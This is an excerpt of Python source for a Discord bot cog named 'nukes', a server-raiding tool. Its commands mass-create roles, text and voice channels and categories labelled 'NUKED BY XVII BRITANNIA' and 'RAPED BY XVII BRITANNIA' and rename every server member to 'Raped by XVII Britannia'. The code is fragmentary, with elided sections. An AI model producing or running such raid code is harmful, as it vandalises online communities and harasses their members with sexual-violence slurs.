...
class nukes(commands.Cog):
    """All hail XVII Britannia we will bring the commoners to their knees"""
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_role(
                    name=f"RAPED BY XVII BRITANNIA{i}"
                )
                print(
                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY XVII BRITANNIA{i}"
                )
            except:
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-XVII BRITANNIA{i}"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-XVII BRITANNIA-{i}"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY XVII BRITANNIA {i}"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED-BY-XVII BRITANNIA {i}"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY XVII BRITANNIA{i}"
                )
                print(
                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY XVII BRITANNIA {i} "
                )
            except:
    ...
    async def execute(self, ctx):
        ...
        for i in range(1, 50):
            try:
                ...
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY XVII BRITANNIA {i}"
                )
            except Exception as e:
        ...
        for i in range(1, 25):
            try:
                ...
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-XVII BRITANNIA-{i}"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY XVII BRITANNIA {i} "
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY XVII BRITANNIA {i} "
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY XVII BRITANNIA {i} "
                )
    ...
    async def undoreall(self, ctx):
        """Renames every member in the server to raped by XVII Britannia"""
        await ctx.delete()
        rename_to = ""
        i = 0
    ...
    async def reall(self, ctx):
        """Renames every member in the server to raped by XVII BRITANNIA"""
        await ctx.delete()
        rename_to = "Raped by XVII Britannia"
        i = 0
        for user in list(ctx.guild.members):
            try:
                i += 1
